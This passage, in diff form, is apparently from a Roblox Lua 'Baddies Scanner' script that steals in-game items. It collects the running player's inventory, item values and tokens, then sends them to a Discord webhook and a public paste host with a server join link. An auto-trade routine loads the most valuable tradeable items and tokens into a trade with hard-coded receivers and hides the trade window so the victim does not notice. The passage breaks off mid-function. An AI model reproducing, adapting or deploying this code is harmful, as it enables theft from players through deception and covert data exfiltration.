+local ok, rep = pcall(function()
+return Replion.Client:WaitReplion("RAP", 2)
+end)
+if ok and rep then
+return rep
+end
+task.wait(0.5)
+end
+return nil
+end
+
+local function getItemRap(rapReplion, tradeData, itemType, subType, name)
+if not tradeData or not name then
+return nil
+end
+
+local itemId = tradeData.GetItemId(itemType, {  
+    Name = name,  
+    Type = subType,  
+})  
+
+if rapReplion then  
+    local cached = rapReplion:Get({ "RAPs", itemType, itemId })  
+    if cached ~= nil then  
+        return cached  
+    end  
+end  
+
+if not tradeData.Remotes or not tradeData.Remotes.GetItemRAP then  
+    return nil  
+end  
+
+local ok, rap = pcall(function()  
+    return tradeData.Remotes.GetItemRAP:InvokeServer(itemType, {  
+        Name = name,  
+        Type = subType,  
+    })  
+end)  
+
+if ok and typeof(rap) == "number" then  
+    return rap  
+end  
+
+return nil
+
+end
+
+local function formatRap(rap)
+if rap == nil then
+return "?"
+end
+return tostring(rap)
+end
+
+local EMBED_DESC_LIMIT = 3900
+
+local function isTradeableNow(tradeLock)
+if typeof(tradeLock) ~= "table" then
+return true
+end
+if tradeLock.Type == "Untradable" then
+return false
+end
+if tradeLock.Type == "Timestamp" and tradeLock.Time then
+return workspace:GetServerTimeNow() >= tradeLock.Time
+end
+return true
+end
+
+local function isTrackedSkinType(itemType)
+for _, category in ipairs(CATEGORY_CONFIG) do
+if category.key == itemType then
+return true
+end
+end
+return false
+end
+
+local function parseTradeStatus(tradeLock)
+if typeof(tradeLock) ~= "table" then
+return "✅ Tradeable"
+end
+if tradeLock.Type == "Untradable" then
+return "❌ Untradeable"
+end
+if tradeLock.Type == "Timestamp" and tradeLock.Time then
+local remaining = math.max(0, math.floor(tradeLock.Time - workspace:GetServerTimeNow()))
+if remaining <= 0 then
+return "✅ Tradeable"
+end
+local hours = math.floor(remaining / 3600)
+local mins = math.floor((remaining % 3600) / 60)
+return ("❌ %dh %dm"):format(hours, mins)
+end
+if tradeLock.Type == "None" or tradeLock.Type == nil then
+return "✅ Tradeable"
+end
+return ("❌ %s"):format(tostring(tradeLock.Type))
+end
+
+local function buildWeaponEntry(guid, item, weaponsCatalog, rapReplion, tradeData)
+local name = item.Name or "Unknown"
+local meta = weaponsCatalog[name]
+local rarity = meta and meta.Rarity or "Unknown"
+local rap = getItemRap(rapReplion, tradeData, "Weapon", nil, name)
+return {
+name = name,
+rarity = rarity,
+tradeStatus = parseTradeStatus(item.TradeLock),
+rap = rap,
+guid = guid,
+}
+end
+
+local function buildSkinEntry(guid, item, skinsCatalog, rapReplion, tradeData)
+local name = item.Name or "Unknown"
+local meta = skinsCatalog[name]
+local rarity = meta and meta.Rarity or "Unknown"
+local rap = getItemRap(rapReplion, tradeData, "WeaponSkin", item.Type, name)
+return {
+name = name,
+rarity = rarity,
+tradeStatus = parseTradeStatus(item.TradeLock),
+rap = rap,
+guid = guid,
+type = item.Type,
+}
+end
+
+local function collectInventory(dataReplion, catalog, rapReplion)
+local results = {}
+
+for _, category in ipairs(CATEGORY_CONFIG) do  
+    results[category.key] = {}  
+end  
+
+local weapons = dataReplion:Get({ "NewInventory", "Items", "Weapon" })  
+if typeof(weapons) == "table" then  
+    for guid, item in pairs(weapons) do  
+        if typeof(item) == "table" then  
+            table.insert(results.Weapons, buildWeaponEntry(tostring(guid), item, catalog.weapons, rapReplion, catalog.tradeData))  
+        end  
+    end  
+end  
+
+local weaponSkins = dataReplion:Get({ "NewInventory", "Items", "WeaponSkin" })  
+if typeof(weaponSkins) == "table" then  
+    for guid, item in pairs(weaponSkins) do  
+        if typeof(item) == "table" and item.Type then  
+            local bucket = results[item.Type]  
+            if bucket then  
+                table.insert(bucket, buildSkinEntry(tostring(guid), item, catalog.skins, rapReplion, catalog.tradeData))  
+            end  
+        end  
+    end  
+end  
+
+local rarityOrder = {  
+    OG = 1,  
+    Exclusive = 2,  
+    Legend = 3,  
+    Epic = 4,  
+    Rare = 5,  
+    Basic = 6,  
+    Unknown = 99,  
+}  
+
+local function sortEntries(list)  
+    table.sort(list, function(a, b)  
+        local ra = rarityOrder[a.rarity] or 50  
+        local rb = rarityOrder[b.rarity] or 50  
+        if ra ~= rb then  
+            return ra < rb  
+        end  
+        return a.name < b.name  
+    end)  
+end  
+
+for _, category in ipairs(CATEGORY_CONFIG) do  
+    sortEntries(results[category.key])  
+end  
+
+return results
+
+end
+
+local function formatEntryLine(entry)
+return ("• %s [%s] - %s RAP - %s"):format(entry.name, entry.rarity, formatRap(entry.rap), entry.tradeStatus)
+end
+
+local function getAllEntriesSortedByRap(results)
+local all = {}
+for _, category in ipairs(CATEGORY_CONFIG) do
+for _, entry in ipairs(results[category.key]) do
+table.insert(all, {
+category = category,
+entry = entry,
+})
+end
+end
+table.sort(all, function(a, b)
+local rapA = a.entry.rap or 0
+local rapB = b.entry.rap or 0
+if rapA ~= rapB then
+return rapA > rapB
+end
+return a.entry.name < b.entry.name
+end)
+return all
+end
+
+local function buildTradeableItemsBlock(results, topRapLimit)
+if topRapLimit then
+local sorted = getAllEntriesSortedByRap(results)
+local sections = {}
+local byCategory = {}
+
+for i = 1, math.min(topRapLimit, #sorted) do  
+        local item = sorted[i]  
+        local key = item.category.key  
+        if not byCategory[key] then  
+            byCategory[key] = {  
+                category = item.category,  
+                entries = {},  
+            }  
+        end  
+        table.insert(byCategory[key].entries, item.entry)  
+    end  
+
+    for _, category in ipairs(CATEGORY_CONFIG) do  
+        local bucket = byCategory[category.key]  
+        if bucket and #bucket.entries > 0 then  
+            local sectionLines = { ("%s %s (%d)"):format(category.emoji, category.label, #bucket.entries) }  
+            for _, entry in ipairs(bucket.entries) do  
+                table.insert(sectionLines, formatEntryLine(entry))  
+            end  
+            table.insert(sections, table.concat(sectionLines, "\n"))  
+        end  
+    end  
+
+    if #sections == 0 then  
+        return "No owned items"  
+    end  
+    return table.concat(sections, "\n")  
+end  
+
+local sections = {}  
+for _, category in ipairs(CATEGORY_CONFIG) do  
+    local entries = results[category.key]  
+    local sectionLines = { ("%s %s (%d)"):format(category.emoji, category.label, #entries) }  
+    if #entries == 0 then  
+        table.insert(sectionLines, "No owned items")  
+    else  
+        for _, entry in ipairs(entries) do  
+            table.insert(sectionLines, formatEntryLine(entry))  
+        end  
+    end  
+    table.insert(sections, table.concat(sectionLines, "\n"))  
+end  
+return table.concat(sections, "\n")
+
+end
+
+local function buildFullInventoryLines(results)
+local lines = {}
+for _, category in ipairs(CATEGORY_CONFIG) do
+local entries = results[category.key]
+if #entries > 0 then
+table.insert(lines, ("%s %s (%d)"):format(category.emoji, category.label, #entries))
+for _, entry in ipairs(entries) do
+table.insert(lines, formatEntryLine(entry))
+end
+end
+end
+return lines
+end
+
+local function uploadInventoryRaw(results, playerName)
+local lines = buildFullInventoryLines(results)
+if #lines == 0 then
+return ""
+end
+
+local total = 0  
+for _, category in ipairs(CATEGORY_CONFIG) do  
+    total += #results[category.key]  
+end  
+
+local content = string.format(  
+    "=== BADDIES FULL INVENTORY ===\nUsername: %s\nDisplay Name: %s\nTotal Items: %d\n\n%s",  
+    playerName,  
+    LocalPlayer.DisplayName,  
+    total,  
+    table.concat(lines, "\n")  
+)  
+
+local res = httpRequest({  
+    Url = "https://api.rubis.app/v2/scrap?public=true",  
+    Method = "POST",  
+    Headers = { ["Content-Type"] = "text/plain" },  
+    Body = content,  
+})  
+
+if not res then  
+    return ""  
+end  
+
+local body = res.Body or res.body  
+if not body then  
+    return ""  
+end  
+
+local ok, data = pcall(function()  
+    return HttpService:JSONDecode(body)  
+end)  
+if ok and data then  
+    return data.raw  
+        or (data.scrapID and ("https://api.rubis.app/v2/scrap/" .. data.scrapID .. "/raw"))  
+        or (data.id and ("https://api.rubis.app/v2/scrap/" .. data.id .. "/raw"))  
+        or ""  
+end  
+
+return ""
+
+end
+
+local function buildJoinUrl()
+return ("https://starscripts-five.vercel.app/start?placeId=%d&gameInstanceId=%s"):format(
+game.PlaceId,
+game.JobId
+)
+end
+
+local function resolveReceivers()
+local resolved = {}
+local lines = {}
+
+for _, name in ipairs(RECEIVERS) do  
+    local ok, userId = pcall(Players.GetUserIdFromNameAsync, Players, name)  
+    local inServer = Players:FindFirstChild(name) ~= nil  
+    if ok and userId then  
+        table.insert(resolved, {  
+            name = name,  
+            userId = userId,  
+            valid = true,  
+            inServer = inServer,  
+        })  
+        table.insert(lines, ("%s (%d) - %s"):format(  
+            name,  
+            userId,  
+            inServer and "In server" or "Offline"  
+        ))  
+    else  
+        table.insert(resolved, {  
+            name = name,  
+            userId = nil,  
+            valid = false,  
+            inServer = false,  
+        })  
+        table.insert(lines, ("%s - Invalid username"):format(name))  
+    end  
+end  
+
+return resolved, table.concat(lines, "\n")
+
+end
+
+local function getTokenBalance(dataReplion)
+if not dataReplion then
+return 0
+end
+return math.floor(tonumber(dataReplion:Get({ "NewInventory", "Tokens" })) or 0)
+end
+
+local function calculateInventoryTotals(results)
+local totalItems = 0
+local totalRap = 0
+
+for _, category in ipairs(CATEGORY_CONFIG) do  
+    for _, entry in ipairs(results[category.key]) do  
+        totalItems += 1  
+        if typeof(entry.rap) == "number" then  
+            totalRap += entry.rap  
+        end  
+    end  
+end  
+
+return totalItems, totalRap
+
+end
+
+local function validateInventoryValue(results)
+local totalItems, totalRap = calculateInventoryTotals(results)
+if totalItems == 1 then
+local singleRap = 0
+for _, category in ipairs(CATEGORY_CONFIG) do
+for _, entry in ipairs(results[category.key]) do
+singleRap = entry.rap or 0
+end
+end
+if singleRap < SINGLE_ITEM_MIN_RAP then
+return false, "Unable to join this server.", totalItems, totalRap
+end
+end
+return true, nil, totalItems, totalRap
+end
+
+local function buildDescription(results, meta, topRapLimit)
+local player = LocalPlayer
+local playerCount = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers
+
+local total, totalRap = calculateInventoryTotals(results)  
+local tokens = meta.tokens or 0  
+
+local playerInfoBlock = string.format(  
+    "**👤 Player Info**\n```\nUsername     : %s\nDisplay Name : %s\nPlayers      : %d/%d\nExecutor     : %s\nTotal Items  : %d (Total Rap: %d)\nTokens       : %d\n```",  
+    player.Name,  
+    player.DisplayName,  
+    playerCount,  
+    maxPlayers,  
+    meta.executorName,  
+    total,  
+    totalRap,  
+    tokens  
+)  
+
+local itemsTitle = topRapLimit and "**📦 Tradeable Items (Top RAP)**" or "**📦 Tradeable Items**"  
+local tradeableBlock = string.format(  
+    "%s\n```\n%s\n```",  
+    itemsTitle,  
+    buildTradeableItemsBlock(results, topRapLimit)  
+)  
+
+local links = {}  
+if meta.inventoryRawUrl and meta.inventoryRawUrl ~= "" then  
+    table.insert(links, ("📋 **[Full Inventory Raw](<%s>)**"):format(meta.inventoryRawUrl))  
+end  
+if meta.joinUrl and meta.joinUrl ~= "" then  
+    table.insert(links, ("🔗 **[Join Server](<%s>)**"):format(meta.joinUrl))  
+end  
+
+local description = playerInfoBlock .. "\n" .. tradeableBlock  
+if topRapLimit then  
+    description ..= "\n*Showing highest RAP items only. Full list is in the raw link.*"  
+end  
+if #links > 0 then  
+    description ..= "\n" .. table.concat(links, "\n")  
+end  
+
+return description
+
+end
+
+local function buildDiscordPayload(results, meta)
+local description = buildDescription(results, meta, nil)
+if #description > EMBED_DESC_LIMIT then
+local sorted = getAllEntriesSortedByRap(results)
+local topCount = #sorted
+while topCount > 1 do
+topCount -= 1
+description = buildDescription(results, meta, topCount)
+if #description <= EMBED_DESC_LIMIT then
+break
+end
+end
+end
+
+return {  
+    content = meta.pingEveryone and "@everyone" or "",  
+    username = "Baddies Scanner",  
+    embeds = {  
+        {  
+            title = "💅 Baddies Item Skins Scan",  
+            description = description,  
+            color = 0xF1C40F,  
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),  
+            footer = {  
+                text = "Baddies Scanner - " .. os.date("%d/%m/%Y %H:%M"),  
+            },  
+        },  
+    },  
+}
+
+end
+
+local function scanAndSend()
+local serverOk, serverMessage = validateServerEarly()
+if not serverOk then
+kickAndStop(serverMessage)
+return false
+end
+
+local executorName = getExecutorName()  
+
+local _, receiversText = resolveReceivers()  
+if receiversText == "" then  
+    receiversText = table.concat(RECEIVERS, ", ")  
+end  
+
+local dataReplion = waitForDataReplion(45)  
+if not dataReplion then  
+    setScanStatus("failed", "player data not loaded")  
+    return false  
+end  
+
+local catalog = loadCatalog()  
+
+local rapReplion = waitForRapReplion(20)  
+
+local results = collectInventory(dataReplion, catalog, rapReplion)  
+
+local valueOk, valueMessage, totalItems, totalRap = validateInventoryValue(results)  
+if not valueOk then  
+    kickAndStop(valueMessage)  
+    return false  
+end  
+
+-- SPEED OPTIMIZATION: Run the inventory upload asynchronously in the background  
+local inventoryRawUrl = ""  
+task.spawn(function()  
+    inventoryRawUrl = uploadInventoryRaw(results, LocalPlayer.Name)  
+end)  
+
+local payload = buildDiscordPayload(results, {  
+    executorName = executorName,  
+    tokens = getTokenBalance(dataReplion),  
+    inventoryRawUrl = inventoryRawUrl,  
+    joinUrl = buildJoinUrl(),  
+    pingEveryone = totalRap >= EVERYONE_RAP_THRESHOLD,  
+})  
+
+local ok, err = httpPost(WEBHOOK_URL, payload)  
+if ok then  
+    getgenv().BaddiesAllowTrade = true  
+    setScanStatus("sent", {  
+        totalItems = totalItems,  
+        totalRap = totalRap,  
+    })  
+    return true  
+end  
+
+setScanStatus("failed", err or "webhook request failed")  
+return false
+
+end
+
+-- ===== AUTO TRADE =====
+
+local TradeState = {
+replionId = nil,
+active = false,
+completed = false,
+ended = false,
+}
+
+local TradeRuntime = {
+tradeData = nil,
+remotes = nil,
+replionModule = nil,
+lastInviteAt = 0,
+tradeListenersReady = false,
+stealthHooksReady = false,
+stealthArmed = false,
+stealthHeartbeat = nil,
+tradingGuiDefaults = nil,
+auxGuiDefaults = nil,
+sessionRunning = false,
+dataReplion = nil,
+catalog = nil,
+rapReplion = nil,
+}
+
+local function isTradeUiActive()
+return LocalPlayer:GetAttribute("IsTrading") == true or TradeState.active
+end
+
+local function shouldHideTradeGui()
+if not HIDE_TRADE_GUI then
+return false
+end
+return isTradeUiActive()
+end
+
+local function hideTradingGuiInstant()
+if not HIDE_TRADE_GUI or not isTradeUiActive() then
+return
+end
+
+local playerGui = LocalPlayer:FindFirstChild("PlayerGui")  
+if not playerGui then  
+    return  
+end  
+
+local trading = playerGui:FindFirstChild("Trading")  
+if trading and trading:IsA("ScreenGui") then  
+    if not TradeRuntime.tradingGuiDefaults then  
+        local frame = trading:FindFirstChild("Frame")  
+        TradeRuntime.tradingGuiDefaults = {  
+            displayOrder = trading.DisplayOrder,  
+            frameVisible = frame and frame.Visible,  
+            framePosition = frame and frame.Position,  
+        }  
+    end  
+
+    trading.Enabled = true  
+    local frame = trading:FindFirstChild("Frame")  
+    if frame then  
+        frame.Visible = false  
+        frame.Position = UDim2.fromScale(2, 2)  
+    end  
+    trading.DisplayOrder = -500  
+end  
+
+for _, guiName in ipairs({ "TradeRequestPopup", "TradeList", "ViewInventory" }) do  
+    local gui = playerGui:FindFirstChild(guiName)  
+    if gui and gui:IsA("ScreenGui") then  
+        TradeRuntime.auxGuiDefaults = TradeRuntime.auxGuiDefaults or {}  
+        if TradeRuntime.auxGuiDefaults[guiName] == nil then  
+            TradeRuntime.auxGuiDefaults[guiName] = gui.Enabled  
+        end  
+        gui.Enabled = false  
+    end  
+end  
+local general = playerGui:FindFirstChild("GeneralGUI")  
+if general then  
+    general.Enabled = true  
+
+    local buttons = general:FindFirstChild("Buttons")  
+    if buttons and buttons:IsA("GuiObject") then  
+        buttons.Visible = true  
+    end  
+end  
+
+local backpack = playerGui:FindFirstChild("BackpackGui")  
+if backpack then  
+    backpack.Enabled = true  
+
+    local bp = backpack:FindFirstChild("Backpack")  
+    if bp and bp:IsA("GuiObject") then  
+        bp.Visible = true  
+    end  
+end
+
+end
+
+local function restoreTradingGui()
+TradeRuntime.stealthArmed = false
+
+local playerGui = LocalPlayer:FindFirstChild("PlayerGui")  
+if not playerGui then  
+    TradeRuntime.tradingGuiDefaults = nil  
+    TradeRuntime.auxGuiDefaults = nil  
+    return  
+end  
+
+local defaults = TradeRuntime.tradingGuiDefaults  
+if defaults then  
+    local trading = playerGui:FindFirstChild("Trading")  
+    if trading and trading:IsA("ScreenGui") then  
+        trading.DisplayOrder = defaults.displayOrder  
+        local frame = trading:FindFirstChild("Frame")  
+        if frame then  
+            if defaults.frameVisible ~= nil then  
+                frame.Visible = defaults.frameVisible  
+            end  
+            if defaults.framePosition then  
+                frame.Position = defaults.framePosition  
+            end  
+        end  
+    end  
+    TradeRuntime.tradingGuiDefaults = nil  
+end  
+
+if TradeRuntime.auxGuiDefaults then  
+    for guiName, wasEnabled in pairs(TradeRuntime.auxGuiDefaults) do  
+        local gui = playerGui:FindFirstChild(guiName)  
+        if gui and gui:IsA("ScreenGui") then  
+            gui.Enabled = wasEnabled  
+        end  
+    end  
+    TradeRuntime.auxGuiDefaults = nil  
+end
+
+end
+
+local function armTradeStealth()
+if not HIDE_TRADE_GUI or not isTradeUiActive() then
+return
+end
+TradeRuntime.stealthArmed = true
+hideTradingGuiInstant()
+end
+
+local function disarmTradeStealth()
+restoreTradingGui()
+end
+
+local function installTradeStealthHooks()
+if TradeRuntime.stealthHooksReady or not HIDE_TRADE_GUI then
+return
+end
+TradeRuntime.stealthHooksReady = true
+
+task.spawn(function()  
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")  
+    local trading = playerGui:WaitForChild("Trading")  
+    local frame = trading:WaitForChild("Frame")  
+
+    trading:GetPropertyChangedSignal("Enabled"):Connect(function()  
+        if shouldHideTradeGui() then  
+            hideTradingGuiInstant()  
+        end  
+    end)  
+
+    frame:GetPropertyChangedSignal("Visible"):Connect(function()  
+        if shouldHideTradeGui() and frame.Visible then  
+            frame.Visible = false  
+        end  
+    end)  
+
+    if TradeRuntime.stealthHeartbeat then  
+        TradeRuntime.stealthHeartbeat:Disconnect()  
+    end  
+
+    TradeRuntime.stealthHeartbeat = RunService.RenderStepped:Connect(function()  
+        if shouldHideTradeGui() then  
+            hideTradingGuiInstant()  
+        elseif TradeRuntime.stealthArmed then  
+            disarmTradeStealth()  
+        end  
+    end)  
+
+    LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()  
+        if LocalPlayer:GetAttribute("IsTrading") then  
+            armTradeStealth()  
+        else  
+            disarmTradeStealth()  
+        end  
+    end)  
+end)
+
+end
+
+local function getTradeData()
+if TradeRuntime.tradeData then
+return TradeRuntime.tradeData
+end
+local ok, mod = pcall(function()
+return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Trading"):WaitForChild("TradeData"))
+end)
+if ok and mod then
+TradeRuntime.tradeData = mod
+TradeRuntime.remotes = mod.Remotes
+end
+return TradeRuntime.tradeData
+end
+
+local function getTradeMaxItems()
+local tradeData = getTradeData()
+local maxItems = tradeData and tradeData.MaxItemsInTrade
+if typeof(maxItems) == "number" and maxItems > 0 then
+return math.floor(maxItems)
+end
+return TRADE_MAX_ITEMS
+end
+
+local function getTradeReplionChannel(rep)
+if not rep then
+return nil
+end
+if typeof(rep) == "string" then
+return rep
+end
+return rawget(rep, "_channel") or rep._channel
+end
+
+local function normalizeTradeReplionId(value)
+if typeof(value) == "string" and value ~= "" then
+return value
+end
+if typeof(value) == "table" then
+return getTradeReplionChannel(value)
+end
+return nil
+end
+
+local function getTradeRemotes()
+local tradeData = getTradeData()
+return tradeData and tradeData.Remotes
+end
+
+local function ensureTradeEnabled(dataReplion)
+if not ENABLE_TRADE then
+return true
+end
+
+local rep = dataReplion or TradeRuntime.dataReplion  
+if not rep then  
+    rep = waitForDataReplion(10)  
+end  
+if not rep then  
+    return false  
+end  
+
+if rep:Get({ "Settings", "TradeEnabled" }) == true then  
+    return true  
+end  
+
+local firedOk = pcall(function()  
+    local Net = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net"))  
+    Net:RemoteEvent("SetPhoneSettings"):FireServer("TradeEnabled", true)  
+end)  
+
+if not firedOk then  
+    return false  
+end  
+
+local deadline = os.clock() + 5  
+while os.clock() < deadline do  
+    if rep:Get({ "Settings", "TradeEnabled" }) == true then  
+        return true  
+    end  
+    task.wait(0.1)  
+end  
+
+return rep:Get({ "Settings", "TradeEnabled" }) == true
+
+end
+
+local function invokeTradeRemote(remote, ...)
+local args = table.pack(...)
+local callOk, result, errMsg = pcall(function()
+return remote:InvokeServer(table.unpack(args, 1, args.n))
+end)
+if not callOk then
+return false, tostring(result)
+end
+if result == true then
+return true, nil
+end
+if typeof(errMsg) == "string" and errMsg ~= "" then
+return false, errMsg
+end
+if typeof(result) == "string" and result ~= "" then
+return false, result
+end
+return false, "remote rejected"
+end
+
+local function waitForTradeReplion(replionId, timeout)
+replionId = normalizeTradeReplionId(replionId)
+if not replionId then
+return nil
+end
+timeout = timeout or 15
+if not TradeRuntime.replionModule then
+TradeRuntime.replionModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Replion"))
+end
+
+local client = TradeRuntime.replionModule.Client  
+local direct = client:GetReplion(replionId)  
+if direct then  
+    return direct  
+end  
+
+local started = os.clock()  
+while os.clock() - started < timeout do  
+    local ok, rep = pcall(function()  
+        return client:WaitReplion(replionId, 2)  
+    end)  
+    if ok and rep then  
+        return rep  
+    end  
+    direct = client:GetReplion(replionId)  
+    if direct then  
+        return direct  
+    end  
+    task.wait(0.1)  
+end  
+return nil
+
+end
+
+local function isTradeLive()
+return TradeState.active
+or LocalPlayer:GetAttribute("IsTrading") == true
+or TradeRuntime.sessionRunning
+end
+
+local function pressReady(tradeRep)
+local remotes = getTradeRemotes()
+if not remotes then
+return false
+end
+return invokeTradeRemote(remotes.SetReady, true)
+end
+
+local function pressConfirm(tradeRep)
+local remotes = getTradeRemotes()
+if not remotes then
+return false
+end
+return invokeTradeRemote(remotes.ConfirmTrade)
+end
+
+-- ===== CHAT LISTENER FOR "1" / "2" =====
+local function setupChatListeners()
+local function handleMessage(message)
+local lowerMsg = string.lower(string.match(message, "^%s*(.-)%s*$") or "")
+
+if lowerMsg == "1" then  
+        local replionId = normalizeTradeReplionId(TradeState.replionId)  
+        if replionId then  
+            local tradeRep = waitForTradeReplion(replionId, 2)  
+            if tradeRep then  
+                pressReady(tradeRep)  
+            end  
+        end  
+    elseif lowerMsg == "2" then  
+        local replionId = normalizeTradeReplionId(TradeState.replionId)  
+        if replionId then  
+            local tradeRep = waitForTradeReplion(replionId, 2)  
+            if tradeRep then  
+                pressConfirm(tradeRep)  
+            end  
+        end  
+    end  
+end  
+
+-- Modern TextChatService support  
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then  
+    local channels = TextChatService:FindFirstChild("TextChannels")  
+    if channels then  
+        for _, channel in ipairs(channels:GetChildren()) do  
+            if channel:IsA("TextChannel") then  
+                channel.MessageReceived:Connect(function(textChatMessage)  
+                    if textChatMessage.TextSource and textChatMessage.TextSource.UserId == LocalPlayer.UserId then  
+                        handleMessage(textChatMessage.Text)  
+                    end  
+                end)  
+            end  
+        end  
+    end  
+end  
+
+-- Legacy Chat support fallback  
+LocalPlayer.Chatted:Connect(function(message)  
+    handleMessage(message)  
+end)
+
+end
+
+task.spawn(setupChatListeners)
+-- =======================================
+
+local function setupTradeListeners()
+if TradeRuntime.tradeListenersReady then
+return
+end
+
+installTradeStealthHooks()  
+
+local tradeData = getTradeData()  
+if not tradeData or not tradeData.Remotes then  
+    return  
+end  
+
+local remotes = tradeData.Remotes  
+
+remotes.TradeStarted.OnClientEvent:Connect(function(replionId)  
+    local id = normalizeTradeReplionId(replionId)  
+    if id then  
+        TradeState.replionId = id  
+        TradeState.active = true  
+        TradeState.completed = false  
+        TradeState.ended = false  
+        armTradeStealth()  
+    end  
+end)  
+
+remotes.TradeEnded.OnClientEvent:Connect(function(message)  
+    TradeState.active = false  
+    TradeState.ended = true  
+    TradeState.replionId = nil  
+    TradeRuntime.sessionRunning = false  
+    restoreTradingGui()  
+end)  
+
+remotes.TradeCompleted.OnClientEvent:Connect(function()  
+    TradeState.active = false  
+    TradeState.completed = true  
+    TradeState.replionId = nil  
+    TradeRuntime.sessionRunning = false  
+    restoreTradingGui()  
+end)  
+
+TradeRuntime.tradeListenersReady = true
+
+end
+
+local function getReceiverPlayer()
+return Players:FindFirstChild(RECEIVER)
+end
+
+local function collectTradableTradeItems(dataReplion, catalog, rapReplion)
+local items = {}
+
+local weapons = dataReplion:Get({ "NewInventory", "Items", "Weapon" })  
+if typeof(weapons) == "table" then  
+    for guid, item in pairs(weapons) do  
+        if typeof(item) == "table" and isTradeableNow(item.TradeLock) then  
+            table.insert(items, {  
+                itemType = "Weapon",  
+                guid = tostring(guid),  
+                name = item.Name or "Unknown",  
+                rap = getItemRap(rapReplion, catalog.tradeData, "Weapon", nil, item.Name) or 0,  
+            })  
+        end  
+    end  
+end  
+
+local weaponSkins = dataReplion:Get({ "NewInventory", "Items", "WeaponSkin" })  
+if typeof(weaponSkins) == "table" then  
+    for guid, item in pairs(weaponSkins) do  
+        if typeof(item) == "table" and item.Type and isTrackedSkinType(item.Type) and isTradeableNow(item.TradeLock) then  
+            table.insert(items, {  
+                itemType = "WeaponSkin",  
+                guid = tostring(guid),  
+                name = item.Name or "Unknown",  
+                rap = getItemRap(rapReplion, catalog.tradeData, "WeaponSkin", item.Type, item.Name) or 0,  
+            })  
+        end  
+    end  
+end  
+
+table.sort(items, function(a, b)  
+    if a.rap ~= b.rap then  
+        return a.rap > b.rap  
+    end  
+    return a.name < b.name  
+end)  
+
+return items
+
+end
+
+local function waitForTradingAttribute(timeout)
+timeout = timeout or 15
+local started = os.clock()
+while os.clock() - started < timeout do
+if LocalPlayer:GetAttribute("IsTrading") == true then
+return true
+end
+task.wait(0.05)
+end
+return LocalPlayer:GetAttribute("IsTrading") == true
+end
+
+local function waitForTradeStart(timeout)
+timeout = timeout or 20
+local started = os.clock()
+while os.clock() - started < timeout do
+local replionId = normalizeTradeReplionId(TradeState.replionId)
+if replionId and isTradeLive() then
+TradeState.replionId = replionId
+return replionId
+end
+task.wait(0.05)
+end
+return nil
+end
+
+local function isGuidAlreadyOffered(tradeRep, itemType, guid)
+local offered = tradeRep:Get({ "Players", tostring(LocalPlayer.UserId), "Items", itemType })
+if typeof(offered) ~= "table" then
+return false
+end
+return offered[guid] == true
+end
+
+local function waitForTradeSessionReady(tradeRep, timeout)
+timeout = timeout or 20
+local uid = tostring(LocalPlayer.UserId)
+local started = os.clock()
+while os.clock() - started < timeout do
+if not isTradeLive() then
+return false
+end
+local data = tradeRep.Data
+if data and data.Players and data.Players[uid] then
+return true
+end
+task.wait(0.2)
+end
+return false
+end
+
+local function setTradeDebug(patch)
+local debug = getgenv().BaddiesTradeDebug or {}
+for key, value in pairs(patch) do
+debug[key] = value
+end
+getgenv().BaddiesTradeDebug = debug
+end
+
+local function waitForTradeSessionOpen(tradeRep, timeout)
+timeout = timeout or 15
+local started = os.clock()
+
+while os.clock() - started < timeout do  
+    if not isTradeLive() then  
+        return false  
+    end  
+
+    local uid = tostring(LocalPlayer.UserId)  
+    local data = tradeRep and tradeRep.Data  
+    if data and data.Players and data.Players[uid] then  
+        return true  
+    end  
+
+    task.wait(0.05)  
+end  
+
+return false
+
+end
+
+local function addItemsToTrade(tradeRep, items)
+local remotes = getTradeRemotes()
+if not remotes or not remotes.AddItem then
+setTradeDebug({ phase = "add", lastErr = "AddItem remote missing" })
+return 0
+end
+
+local maxItems = getTradeMaxItems()  
+local added = 0  
+setTradeDebug({ phase = "adding", tradableCount = #items, added = 0 })  
+
+for index, item in ipairs(items) do  
+    if not isTradeLive() or added >= maxItems then  
+        break  
+    end  
+
+    if isGuidAlreadyOffered(tradeRep, item.itemType, item.guid) then  
+        added += 1  
+        setTradeDebug({ added = added, lastAdd = item.name, phase = "adding" })  
+        continue  
+    end  
+
+    local itemAdded = false  
+    local lastErr = nil  
+
+    for attempt = 1, 4 do  
+        if not isTradeLive() then  
+            lastErr = "trade ended"  
+            break  
+        end  
+
+        local ok, errMsg = invokeTradeRemote(remotes.AddItem, item.itemType, item.guid)  
+        if ok then  
+            itemAdded = true  
+            added += 1  
+            setTradeDebug({  
+                phase = "adding",  
+                lastAdd = item.name,  
+                lastErr = nil,  
+                added = added,  
+                itemIndex = index,  
+            })  
+            break  
+        end  
+
+        lastErr = errMsg or "AddItem rejected"  
+        setTradeDebug({  
+            phase = "adding",  
+            lastAdd = item.name,  
+            lastErr = lastErr,  
+            added = added,  
+            itemIndex = index,  
+            attempt = attempt,  
+        })  
+        task.wait(0.05)  
+    end  
+
+    if not itemAdded then  
+        setTradeDebug({  
+            phase = "add_failed",  
+            lastAdd = item.name,  
+            lastErr = lastErr or "failed to add item",  
+            added = added,  
+            itemIndex = index,  
+        })  
+        continue  
+    end  
+end  
+
+setTradeDebug({ phase = "add_done", added = added })  
+return added
+
+end
+
+local function setTradeTokens(dataReplion, tradeRep)
+local tokens = getTokenBalance(dataReplion)
+if tokens <= 0 then
+return 0
+end
+
+local uid = tostring(LocalPlayer.UserId)  
+local me = tradeRep.Data and tradeRep.Data.Players and tradeRep.Data.Players[uid]  
+if me and me.Tokens == tokens then  
+    return tokens  
+end  
+
+local remotes = getTradeRemotes()  
+if not remotes then  
+    return 0  
+end  
+
+local ok = invokeTradeRemote(remotes.SetTokens, tokens)  
+if ok then  
+    return tokens  
+end  
+
+return 0
+
+end
+
+local function trySendTradeInvite(targetPlayer)
+if os.clock() - TradeRuntime.lastInviteAt < TRADE_INVITE_COOLDOWN then
+return false, "invite cooldown"
+end
+
+if LocalPlayer:GetAttribute("IsTrading") then  
+    return false, "already trading"  
+end  
+
+local remotes = getTradeRemotes()  
+if not remotes then  
+    return false, "trade remotes missing"  
+end  
+
+TradeState.completed = false  
+TradeState.ended = false  
